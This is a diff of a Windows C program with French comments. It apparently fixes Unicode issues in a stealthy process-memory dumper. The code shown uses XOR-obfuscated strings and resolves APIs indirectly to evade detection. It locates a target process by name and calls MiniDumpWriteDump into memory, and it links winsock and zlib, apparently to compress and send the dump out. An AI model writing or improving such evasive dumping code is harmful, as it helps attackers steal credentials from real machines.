@@ -1,3 +1,7 @@
+#define UNICODE
+#define _UNICODE
+
+#include <winsock2.h>
 #include <windows.h>
 #include <tlhelp32.h>
 #include <dbghelp.h>
@@ -5,11 +9,21 @@
 #include <stdlib.h>
 #include <string.h>
 #include <zlib.h>
-#include <winsock2.h>
 #include <ws2tcpip.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "DbgHelp.lib")
+
+// --- Fonction de conversion ---
+// --- Convertit une chaîne de caractères ANSI (char*) en Unicode (wchar_t*). ---
+wchar_t* ConvertToWideChar(const char* charStr) {
+    int sizeNeeded = MultiByteToWideChar(CP_ACP, 0, charStr, -1, NULL, 0);
+    wchar_t* wStr = (wchar_t*)malloc(sizeNeeded * sizeof(wchar_t));
+    if (wStr) {
+        MultiByteToWideChar(CP_ACP, 0, charStr, -1, wStr, sizeNeeded);
+    }
+    return wStr;
+}
 
 // --- Fonction de déobfuscation ---
 // Décodage d'une chaîne obfusquée (chaque caractère XOR avec la clé)
@@ -31,8 +45,8 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
         return 0;
 
     typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
-    typedef BOOL (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32);
-    typedef BOOL (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32);
+    typedef BOOL (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
+    typedef BOOL (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
     typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
 
     pCreateToolhelp32Snapshot fCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
@@ -47,10 +61,12 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     if (hSnapshot == INVALID_HANDLE_VALUE)
         return 0;
 
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
+    // Utilisation de PROCESSENTRY32W pour travailler avec des chaînes de caractères larges (wchar_t*)
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(PROCESSENTRY32W);
     if (fProcess32FirstW(hSnapshot, &pe)) {
         do {
+            // Comparaison de chaînes larges avec _wcsicmp
             if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
                 pid = pe.th32ProcessID;
                 break;
@@ -61,12 +77,13 @@ DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
     return pid;
 }
 
+
 // --- Fonction de dump mémoire ---
 // Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump (appel indirect déjà présent)
 // et un mapping mémoire temporaire en passant par les appels indirects de kernel32.dll
 BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     // Chargement de DbgHelp.dll et récupération de MiniDumpWriteDump
-    HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
+    HMODULE hDbgHelp = LoadLibraryW(L"DbgHelp.dll");
     if (!hDbgHelp)
         return FALSE;
 
